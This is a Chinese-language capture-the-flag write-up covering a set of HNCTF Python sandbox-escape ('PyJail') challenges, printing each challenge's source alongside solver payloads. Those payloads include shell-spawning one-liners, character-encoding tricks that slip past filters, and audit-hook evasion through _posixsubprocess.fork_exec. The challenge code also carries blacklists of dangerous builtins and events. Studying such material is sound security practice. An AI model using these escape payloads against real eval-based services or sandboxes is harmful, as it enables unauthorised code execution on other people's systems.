# HNCTF_PyJail练习


通过HNCTF的题目学习PyJail

<!--more-->

分析过程和wp主要参考：

https://zhuanlan.zhihu.com/p/578966149

### calc_jail_beginner

下载附件

```
#Your goal is to read ./flag.txt
#You can use these payload liked `__import__('os').system('cat ./flag.txt')` or `print(open('/flag.txt').read())`

WELCOME = '''
  _     ______      _                              _       _ _ 
 | |   |  ____|    (_)                            | |     (_) |
 | |__ | |__   __ _ _ _ __  _ __   ___ _ __       | | __ _ _| |
 | '_ \|  __| / _` | | '_ \| '_ \ / _ \ '__|  _   | |/ _` | | |
 | |_) | |___| (_| | | | | | | | |  __/ |    | |__| | (_| | | |
 |_.__/|______\__, |_|_| |_|_| |_|\___|_|     \____/ \__,_|_|_|
               __/ |                                           
              |___/                                            
'''

print(WELCOME)

print("Welcome to the python jail")
print("Let's have an beginner jail of calc")
print("Enter your expression and I will evaluate it for you.")
input_data = input("> ")
print('Answer: {}'.format(eval(input_data)))
```

payload

```py
__import__('os').system('sh')
```

### calc_jail_beginner_level1

```
#the function of filter will banned some string ',",i,b
#it seems banned some payload 
#Can u escape it?Good luck!

def filter(s):
    not_allowed = set('"\'`ib')
    return any(c in not_allowed for c in s)

WELCOME = '''
  _                _                           _       _ _   _                _ __ 
 | |              (_)                         (_)     (_) | | |              | /_ |
 | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| || |
 | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | | |/ _ \ \ / / _ \ || |
 | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ || |
 |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_||_|
              __/ |                          _/ |                                  
             |___/                          |__/                                                                                      
'''

print(WELCOME)

print("Welcome to the python jail")
print("Let's have an beginner jail of calc")
print("Enter your expression and I will evaluate it for you.")
input_data = input("> ")
if filter(input_data):
    print("Oh hacker!")
    exit(0)
print('Answer: {}'.format(eval(input_data)))
```

过滤了

```
双引号，单引号，反引号，i，b
```

payload1

```python
# open('flag').read()
open(chr(102)+chr(108)+chr(97)+chr(103)).read()
```

payload2

从显示带有元组的子类入手

```
().__class__.__base__.__subclasses__()
```

其中的b会被ban，使用getattr()函数

```
getattr(().__class__, '__base__').__subclasses__()
```

但其中的单引号会被ban，使用ascii2chr的拼接

```py
chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)
```

得到

```
getattr(().__class__, chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)).__subclasses__()
```

对`__subclasses__`同样的方式绕过

```
getattr(getattr(().__class__,chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()
```

![image-20241010225419287](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241010225419287.png?imageSlim)

倒数第四个子类`<class 'os._wrap_close'>`，则payload

```
().__class__.__base__.__subclasses__()[-4].__init__.__globals__['system']('sh')
```

使用以上方法绕过，得到

```
getattr(getattr(getattr(getattr(().__class__,chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104))
```

### calc_jail_beginner_level2

```
#the length is be limited less than 13
#it seems banned some payload 
#Can u escape it?Good luck!

WELCOME = '''
  _                _                           _       _ _   _                _ ___  
 | |              (_)                         (_)     (_) | | |              | |__ \ 
 | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| |  ) |
 | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | | |/ _ \ \ / / _ \ | / / 
 | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |/ /_ 
 |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|____|
              __/ |                          _/ |                                    
             |___/                          |__/                                                                            
'''

print(WELCOME)

print("Welcome to the python jail")
print("Let's have an beginner jail of calc")
print("Enter your expression and I will evaluate it for you.")
input_data = input("> ")
if len(input_data)>13:
    print("Oh hacker!")
    exit(0)
print('Answer: {}'.format(eval(input_data)))
```

限制传入字符不大于13

参数逃逸

```
exec(input())
__import__('os').system('sh')
```

### calc_jail_beginner_level2.5

```
#the length is be limited less than 13
#it seems banned some payload 
#banned some unintend sol
#Can u escape it?Good luck!

def filter(s):
    BLACKLIST = ["exec","input","eval"]
    for i in BLACKLIST:
        if i in s:
            print(f'{i!r} has been banned for security reasons')
            exit(0)

WELCOME = '''
  _                _                           _       _ _ _                _ ___    _____ 
 | |              (_)                         (_)     (_) | |              | |__ \  | ____|
 | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| |  ) | | |__  
 | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | |/ _ \ \ / / _ \ | / /  |___ \ 
 | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\ V /  __/ |/ /_ _ ___) |
 |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_|_|\___| \_/ \___|_|____(_)____/ 
              __/ |                          _/ |                                          
             |___/                          |__/                                                                                                            
'''

print(WELCOME)

print("Welcome to the python jail")
print("Let's have an beginner jail of calc")
print("Enter your expression and I will evaluate it for you.")
input_data = input("> ")
filter(input_data)
if len(input_data)>13:
    print("Oh hacker!")
    exit(0)
print('Answer: {}'.format(eval(input_data)))
```

payload

```py
breakpoint()
```

就会进到Pdb里面，随后pj直接一句话RCE

### calc_jail_beginner_level3

```
#!/usr/bin/env python3
WELCOME = '''
  _                _                           _       _ _   _                _ ____  
 | |              (_)                         (_)     (_) | | |              | |___ \ 
 | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | __) |
 | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | | |/ _ \ \ / / _ \ ||__ < 
 | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |___) |
 |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|____/ 
              __/ |                          _/ |                                     
             |___/                          |__/                                                                                       
'''

print(WELCOME)
#the length is be limited less than 7
#it seems banned some payload 
#Can u escape it?Good luck!
print("Welcome to the python jail")
print("Let's have an beginner jail of calc")
print("Enter your expression and I will evaluate it for you.")
input_data = input("> ")
if len(input_data)>7:
    print("Oh hacker!")
    exit(0)
res = eval(input_data)
print('Answer: {}'.format(res))
```

限制传入字符不大于7

可以通过`help`函数来进行RCE

开始输入`help()`，进入到help界面，然后随便找个模块，例如`os`输入，此时就会显示`os`模块的帮助页面，输入`!sh`就能进到shell里面去。

payload

```
help()
os
!cat flag
```

### python2 input

```
# It's escape this repeat!

WELCOME = '''
              _   _      ___        ___    _____             _    _ _   
             | | | |    / _ \      |__ \  |_   _|           | |  | | |  
  _ __  _   _| |_| |__ | | | |_ __    ) |   | |  _ __  _ __ | |  | | |_ 
 | '_ \| | | | __| '_ \| | | | '_ \  / /    | | | '_ \| '_ \| |  | | __|
 | |_) | |_| | |_| | | | |_| | | | |/ /_   _| |_| | | | |_) | |__| | |_ 
 | .__/ \__, |\__|_| |_|\___/|_| |_|____| |_____|_| |_| .__/ \____/ \__|
 | |     __/ |                                        | |               
 |_|    |___/                                         |_|                               
'''

print WELCOME

print "Welcome to the python jail"
print "But this program will repeat your messages"
input_data = input("> ")
print input_data
```

> - 在python 2中，`input`函数从标准输入接收输入，并且自动`eval`求值，返回求出来的值；
> - 在python 2中，`raw_input`函数从标准输入接收输入，返回输入字符串；
> - 在python 3中，`input`函数从标准输入接收输入，返回输入字符串；
> - 可以认为，python 2 `input()` = python 2 `eval(raw_input())` = python 3 `eval(input())`

如果碰到python 2中间用了`input`函数，那么我们就可以直接一句话RCE：

```py
__import__('os').system('sh')
```

### lake lake lake

```
#it seems have a backdoor
#can u find the key of it and use the backdoor

fake_key_var_in_the_local_but_real_in_the_remote = "[DELETED]"

def func():
    code = input(">")
    if(len(code)>9):
        return print("you're hacker!")
    try:
        print(eval(code))
    except:
        pass

def backdoor():
    print("Please enter the admin key")
    key = input(">")
    if(key == fake_key_var_in_the_local_but_real_in_the_remote):
        code = input(">")
        try:
            print(eval(code))
        except:
            pass
    else:
        print("Nooo!!!!")

WELCOME = '''
  _       _          _       _          _       _        
 | |     | |        | |     | |        | |     | |       
 | | __ _| | _____  | | __ _| | _____  | | __ _| | _____ 
 | |/ _` | |/ / _ \ | |/ _` | |/ / _ \ | |/ _` | |/ / _ \
 | | (_| |   <  __/ | | (_| |   <  __/ | | (_| |   <  __/
 |_|\__,_|_|\_\___| |_|\__,_|_|\_\___| |_|\__,_|_|\_\___|                                                                                                                                                                     
'''

print(WELCOME)

print("Now the program has two functions")
print("can you use dockerdoor")
print("1.func")
print("2.backdoor")
input_data = input("> ")
if(input_data == "1"):
    func()
    exit(0)
elif(input_data == "2"):
    backdoor()
    exit(0)
else:
    print("not found the choice")
    exit(0)
```

这个key变量是全局变量，可以用`globals()`来泄露所有全局变量的值

```
globals()
```

![image-20241010234418136](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241010234418136.png?imageSlim)

```
__import__('os').system('sh')
cat flag
```

### l@ke l@ke l@ke

```
#it seems have a backdoor as `lake lake lake`
#but it seems be limited!
#can u find the key of it and use the backdoor

fake_key_var_in_the_local_but_real_in_the_remote = "[DELETED]"

def func():
    code = input(">")
    if(len(code)>6):
        return print("you're hacker!")
    try:
        print(eval(code))
    except:
        pass

def backdoor():
    print("Please enter the admin key")
    key = input(">")
    if(key == fake_key_var_in_the_local_but_real_in_the_remote):
        code = input(">")
        try:
            print(eval(code))
        except:
            pass
    else:
        print("Nooo!!!!")

WELCOME = '''
  _         _          _         _          _         _        
 | |  ____ | |        | |  ____ | |        | |  ____ | |       
 | | / __ \| | _____  | | / __ \| | _____  | | / __ \| | _____ 
 | |/ / _` | |/ / _ \ | |/ / _` | |/ / _ \ | |/ / _` | |/ / _ \
 | | | (_| |   <  __/ | | | (_| |   <  __/ | | | (_| |   <  __/
 |_|\ \__,_|_|\_\___| |_|\ \__,_|_|\_\___| |_|\ \__,_|_|\_\___|
     \____/               \____/               \____/                                                                                                                                                                                                                                        
'''

print(WELCOME)

print("Now the program has two functions")
print("can you use dockerdoor")
print("1.func")
print("2.backdoor")
input_data = input("> ")
if(input_data == "1"):
    func()
    exit(0)
elif(input_data == "2"):
    backdoor()
    exit(0)
else:
    print("not found the choice")
    exit(0)
```

calc_jail_beginner_level3的方法不能完全生效

![image-20241010235141324](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241010235141324.png?imageSlim)

```
help()
__main__ //拿到key
随后一句话RCE
```

### laKe laKe laKe

```python
#You finsih these two challenge of leak
#So cool
#Now it's time for laKe!!!!

import random
from io import StringIO
import sys
sys.addaudithook

BLACKED_LIST = ['compile', 'eval', 'exec', 'open']

eval_func = eval
open_func = open

for m in BLACKED_LIST:
    del __builtins__.__dict__[m]


def my_audit_hook(event, _):
    BALCKED_EVENTS = set({'pty.spawn', 'os.system', 'os.exec', 'os.posix_spawn','os.spawn','subprocess.Popen'})
    if event in BALCKED_EVENTS:
        raise RuntimeError('Operation banned: {}'.format(event))

def guesser():
    game_score = 0
    sys.stdout.write('Can u guess the number? between 1 and 9999999999999 > ')
    sys.stdout.flush()
    right_guesser_question_answer = random.randint(1, 9999999999999)
    sys.stdout, sys.stderr, challenge_original_stdout = StringIO(), StringIO(), sys.stdout

    try:
        input_data = eval_func(input(''),{},{})
    except Exception:
        sys.stdout = challenge_original_stdout
        print("Seems not right! please guess it!")
        return game_score
    sys.stdout = challenge_original_stdout

    if input_data == right_guesser_question_answer:
        game_score += 1
    
    return game_score

WELCOME='''
  _       _  __      _       _  __      _       _  __    
 | |     | |/ /     | |     | |/ /     | |     | |/ /    
 | | __ _| ' / ___  | | __ _| ' / ___  | | __ _| ' / ___ 
 | |/ _` |  < / _ \ | |/ _` |  < / _ \ | |/ _` |  < / _ \
 | | (_| | . \  __/ | | (_| | . \  __/ | | (_| | . \  __/
 |_|\__,_|_|\_\___| |_|\__,_|_|\_\___| |_|\__,_|_|\_\___|
                                                         
'''

def main():
    print(WELCOME)
    print('Welcome to my guesser game!')
    game_score = guesser()
    if game_score == 1:
        print('you are really super guesser!!!!')
        print(open_func('flag').read())
    else:
        print('Guess game end!!!')

if __name__ == '__main__':
    sys.addaudithook(my_audit_hook)
    main()
```

这道题涉及到对python random库中函数的分析

分析过程参考

```
https://zhuanlan.zhihu.com/p/579057932
```

payload

```
[random:=__import__('random'), state:=random.getstate(), pre_state:=list(state[1])[:624], random.setstate((3,tuple(pre_state+[0]),None)), random.randint(1, 9999999999999)][-1]
```



### 4 byte command

题目无附件，有回显

```text
  _                _                           _       _ _   _                _ _  _
 | |              (_)                         (_)     (_) | | |              | | || |
 | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_
 | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _|
 | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |
 |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_|
              __/ |                          _/ |
             |___/                          |__/                                                                        

Welcome to the python jail
Let's have an beginner jail of calc
Enter your expression and I will evaluate it for you.
> 
```

payload

```
sh
cat flag
```

另外，读取server.py发现

```
if len(input_data)>4:
    print("Oh hacker!")
    exit(0)
print('Answer: {}'.format(os.system(input_data)))
```

直接将输入的内容作为`os.system()`参数

其他短字符串绕过姿势可以参考

https://xiaolong22333.top/archives/201/

### lak3 lak3 lak3

```
#Hi hackers,lak3 comes back
#Have a good luck on it! :Wink:

import random
from io import StringIO
import sys
sys.addaudithook

BLACKED_LIST = ['compile', 'eval', 'exec']

eval_func = eval
open_func = open

for m in BLACKED_LIST:
    del __builtins__.__dict__[m]


def my_audit_hook(event, _):
    BALCKED_EVENTS = set({'pty.spawn', 'os.system', 'os.exec', 'os.posix_spawn','os.spawn','subprocess.Popen','code.__new__','function.__new__','cpython._PySys_ClearAuditHooks','open'})
    if event in BALCKED_EVENTS:
        raise RuntimeError('Operation banned: {}'.format(event))

def guesser():
    game_score = 0
    sys.stdout.write('Can u guess the number? between 1 and 9999999999999 > ')
    sys.stdout.flush()
    right_guesser_question_answer = random.randint(1, 9999999999999)
    sys.stdout, sys.stderr, challenge_original_stdout = StringIO(), StringIO(), sys.stdout

    try:
        input_data = eval_func(input(''),{},{})
    except Exception:
        sys.stdout = challenge_original_stdout
        print("Seems not right! please guess it!")
        return game_score
    sys.stdout = challenge_original_stdout

    if input_data == right_guesser_question_answer:
        game_score += 1
    
    return game_score

WELCOME='''
  _       _    ____    _       _    ____    _       _    ____  
 | |     | |  |___ \  | |     | |  |___ \  | |     | |  |___ \ 
 | | __ _| | __ __) | | | __ _| | __ __) | | | __ _| | __ __) |
 | |/ _` | |/ /|__ <  | |/ _` | |/ /|__ <  | |/ _` | |/ /|__ < 
 | | (_| |   < ___) | | | (_| |   < ___) | | | (_| |   < ___) |
 |_|\__,_|_|\_\____/  |_|\__,_|_|\_\____/  |_|\__,_|_|\_\____/ 
                                                                                                                                                                       
'''

def main():
    print(WELCOME)
    print('Welcome to my guesser game!')
    game_score = guesser()
    if game_score == 1:
        print('you are really super guesser!!!!')
        print('flag{fake_flag_in_local_but_really_in_The_remote}')
    else:
        print('Guess game end!!!')

if __name__ == '__main__':
    sys.addaudithook(my_audit_hook)
    main()
```

### tyPe Ch@nnEl

```
MY_FLAG = "NSSCTF{fake_flag_in_local_but_really_in_The_remote}"
BLACED_KLIST = '"%&\',-/_:;@\\`{|}~*<=>[] \t\n\r'

def my_safe_check(n):
    return all(ord(m) < 0x7f for m in n) and all(m not in n for m in BLACED_KLIST)

def my_safe_eval(m, my_func):
    if not my_safe_check(m):
        print("Hacker!!!!")
    else:
        try:
            print(eval(f"{my_func.__name__}({m})", {"__builtins__": {my_func.__name__: my_func}, "flag": MY_FLAG}))
        except:
            print("Try again!")

if __name__ == "__main__":
    my_safe_eval(input("Payload:"), type)
```

侧信道注入....没打通

### calc_jail_beginner_level4

```
#No danger function,no chr,Try to hack me!!!!
#Try to read file ./flag


BANLIST = ['__loader__', '__import__', 'compile', 'eval', 'exec', 'chr']

eval_func = eval

for m in BANLIST:
    del __builtins__.__dict__[m]

del __loader__, __builtins__

def filter(s):
    not_allowed = set('"\'`')
    return any(c in not_allowed for c in s)

WELCOME = '''
  _                _                           _       _ _   _                _ _  _   
 | |              (_)                         (_)     (_) | | |              | | || |  
 | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_ 
 | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _|
 | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |  
 |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_|  
              __/ |                          _/ |                                      
             |___/                          |__/                                                                                                                                             
'''

print(WELCOME)

print("Welcome to the python jail")
print("Let's have an beginner jail of calc")
print("Enter your expression and I will evaluate it for you.")
input_data = input("> ")
if filter(input_data):
    print("Oh hacker!")
    exit(0)
print('Answer: {}'.format(eval_func(input_data)))
```

Show subclasses with tuple：

```
().__class__.__base__.__subclasses__()
().__class__.__base__.__subclasses__()[-4].__init__.__globals__['system']('sh')
```

但'被ban了
**方法1：**利用bytes的ASCII list初始化方式

```
().__class__.__base__.__subclasses__()[-4].__init__.__globals__[bytes([115, 121, 115, 116, 101, 109]).decode()](bytes([115, 104]).decode())
```

**方法2：**利用`__doc__`魔术方法

可以从`__doc__`里面去找，用索引的方式得到想要的字符，并拼接在一起，得到我们想要的字符串。

```
().__doc__如下：

"Built-in immutable sequence.\n\nIf no argument is given, the constructor returns an empty tuple.\nIf iterable is specified the tuple is initialized from iterable's items.\n\nIf the argument is a tuple, the return value is the same object."
```

找到对应的偏移量

```
().__doc__.find('s')
```

得到19，然后在payload里面直接使用`().__doc__[19]`，就得到了字符`'s'`

payload

```python
().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__doc__[19]+().__doc__[86]+().__doc__[19]+().__doc__[4]+().__doc__[17]+().__doc__[10]](().__doc__[19]+().__doc__[56])

#().__class__.__base__.__subclasses__()[-4].__init__.__globals__['system']('sh')
```

**方法3：**直接读flag

```
open('flag').read()
```

### calc_jail_beginner_level4.0.5

没有源码

```
  _                _                           _       _ _   _                _ _  _    ___   _____
 | |              (_)                         (_)     (_) | | |              | | || |  / _ \ | ____|
 | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_| | | || |__
 | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _| | | ||___ \
 | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |_| |_| | ___) |
 |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_(_)\___(_)____/
              __/ |                          _/ |
             |___/                          |__/                                                                        

Welcome to the python jail
Let's have an beginner jail of calc
Enter your expression and I will evaluate it for you.
Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals and `,",' Good luck!
> 
```

calc_jail_beginner_level4的两种方法仍然可以用

### calc_jail_beginner_level4.1

```
  _                _                           _       _ _   _                _ _  _  __
 | |              (_)                         (_)     (_) | | |              | | || |/_ |
 | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_| |
 | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _| |
 | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |_| |
 |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_(_)_|
              __/ |                          _/ |
             |___/                          |__/                                                                        

Welcome to the python jail
Let's have an beginner jail of calc
Enter your expression and I will evaluate it for you.
Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,bytes and `,",' Good luck!
> 
```

把bytes删掉了

Show subclasses with tuple：

```
().__class__.__base__.__subclasses__()
```

发现byte类在索引6

```
().__class__.__base__.__subclasses__()[-4].__init__.__globals__[bytes([115, 121, 115, 116, 101, 109]).decode()](bytes([115, 104]).decode())
```

#转换为

```
().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__class__.__base__.__subclasses__()[6]([115, 121, 1
15, 116, 101, 109]).decode()](().__class__.__base__.__subclasses__()[6]([115, 104]).decode())
```

### calc_jail_beginner_level4.2

```text
  _                _                           _       _ _   _                _ _  _   ___
 | |              (_)                         (_)     (_) | | |              | | || | |__ \
 | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_   ) |
 | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _| / /
 | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |_ / /_
 |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_(_)____|
              __/ |                          _/ |
             |___/                          |__/                                                                                                                                                                                                

Welcome to the python jail
Let's have an beginner jail of calc
Enter your expression and I will evaluate it for you.
Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,byte and `,",',+ Good luck!
> 
```

Show subclasses with tuple：

索引byte的方法仍然可以用

```py
().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__class__.__base__.__subclasses__()[6]([115, 121, 115, 116, 101, 109]).decode()](().__class__.__base__.__subclasses__()[6]([115, 104]).decode())
```

题目将`+`也ban了，`__doc__`魔法函数的方法无法直接用

可以改变字符串的拼接方法

```python
''.join(['a', 'b', 'c', 'd'])
```

payload

```
().__class__.__base__.__subclasses__()[-4].__init__.__globals__[str().join([().__doc__[19],().__doc__[86],().__doc__[19],().__doc__[4],().__doc__[17],().__doc__[10]])](str().join([().__doc__[19],().__doc__[56]]))
```

### calc_jail_beginner_level4.3

```
  _                _                           _       _ _   _                _ _  _   ____
 | |              (_)                         (_)     (_) | | |              | | || | |___ \
 | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_  __) |
 | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _||__ <
 | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |_ ___) |
 |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_(_)____/
              __/ |                          _/ |
             |___/                          |__/
                                                                                                                        

Welcome to the python jail
Let's have an beginner jail of calc
Enter your expression and I will evaluate it for you.
Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,bytes,open,type and `,",',+ Good luck!
> 
```

calc_jail_beginner_level4.2的payload仍然可以用

```python
().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__class__.__base__.__subclasses__()[6]([115, 121, 115, 116, 101, 109]).decode()](().__class__.__base__.__subclasses__()[6]([115, 104]).decode())


().__class__.__base__.__subclasses__()[-4].__init__.__globals__[str().join([().__doc__[19],().__doc__[86],().__doc__[19],().__doc__[4],().__doc__[17],().__doc__[10]])](str().join([().__doc__[19],().__doc__[56]]))
```

### calc_jail_beginner_level5

没有附件，只有回显

```
  _                _                           _       _ _ _                _ _____
 | |              (_)                         (_)     (_) | |              | | ____|
 | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| | |__
 | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | |/ _ \ \ / / _ \ |___ \
 | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\ V /  __/ |___) |
 |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_|_|\___| \_/ \___|_|____/
              __/ |                          _/ |
             |___/                          |__/                                                                        

It's so easy challenge!
Seems flag into the dir()
>
```

按题目hint输入`dir()`得到

```py
> dir()
['__builtins__', 'my_flag']
```

随后尝试一句话RCE

```
> __import__('os').system('sh')
sh: 0: can't access tty; job control turned off
$ 
```

### calc_jail_beginner_level5.1

```text
  _                _                           _       _ _ _                _ _____ __
 | |              (_)                         (_)     (_) | |              | | ____/_ |
 | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| | |__  | |
 | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | |/ _ \ \ / / _ \ |___ \ | |
 | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\ V /  __/ |___) || |
 |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_|_|\___| \_/ \___|_|____(_)_|
              __/ |                          _/ |
             |___/                          |__/                                                                        

It's so easy challenge!
Seems flag into the dir()
> 
```

尝试`dir()`，随后一句话RCE，发现`__import__`可能被删了

```
> __import__('os').system('sh')
Traceback (most recent call last):
  File "/home/ctf/./server.py", line 42, in <module>
  File "/home/ctf/./server.py", line 31, in main
  File "/home/ctf/./server.py", line 39, in repl
  File "<string>", line 1, in <module>
NameError: name '__import__' is not defined
```

尝试Show subclasses with tuple

```python
().__class__.__base__.__subclasses__()
#发现<class 'os._wrap_close'>在倒数第6位
().__class__.__base__.__subclasses__()[-6].__init__.__globals__['system']('sh')
```

### calc_jail_beginner_level6

```
  _                _                           _       _ _   _                _   __
 | |              (_)                         (_)     (_) | | |              | | / /
 | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| |/ /_
 | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | | |/ _ \ \ / / _ \ | '_ \
 | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ | (_) |
 |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|\___/
              __/ |                          _/ |
             |___/                          |__/                                                                        

Welcome to the python jail
Let's have an beginner jail of calc
Enter your expression and I will evaluate it for you.
White list of audit hook ===> builtins.input,builtins.input/result,exec,compile
Some code of python jail:

  dict_global = dict()
    while True:
      try:
          input_data = input("> ")
      except EOFError:
          print()
          break
      except KeyboardInterrupt:
          print('bye~~')
          continue
      if input_data == '':
          continue
      try:
          complie_code = compile(input_data, '<string>', 'single')
      except SyntaxError as err:
          print(err)
          continue
      try:
          exec(complie_code, dict_global)
      except Exception as err:
          print(err)

>
```

几乎把所有的hook给ban了

参考https://ctftime.org/writeup/31883

利用`_posixsubprocess.fork_exec`来RCE

但如果我们直接`import _posixsubprocess`，会触发audit hook：

```text
Operation not permitted: import
```

可以通过如下方法绕过：

```py
__builtins__['__loader__'].load_module('_posixsubprocess')
```

或者

```py
__loader__.load_module('_posixsubprocess')
```

因为是多次`exec`，所以我们可以输入多行代码：

```
import os
__loader__.load_module('_posixsubprocess').fork_exec([b"/bin/sh"], [b"/bin/sh"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None)
```

### calc_jail_beginner_level6.1

```
  _                _                           _       _ _   _                _   __
 | |              (_)                         (_)     (_) | | |              | | / /
 | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| |/ /_
 | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | | |/ _ \ \ / / _ \ | '_ \
 | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ | (_) |
 |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|\___/
              __/ |                          _/ |
             |___/                          |__/                                                                        

Welcome to the python jail
Let's have an beginner jail of calc
Enter your expression and I will evaluate it for you.
White list of audit hook ===> builtins.input,builtins.input/result,exec,compile
Some code of python jail:

    dict_global = dict()
    input_code = input("> ")
    complie_code = compile(input_code, '<string>', 'single')
    exec(complie_code, dict_global)

> 
```

使用海象运算符

```
[os := __import__('os'), _posixsubprocess := __loader__.load_module('_posixsubprocess'), _posixsubprocess.fork_exec([b"/bin/sh"], [b"/bin/sh"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None)]
```

但是起来shell会立刻断掉

```py
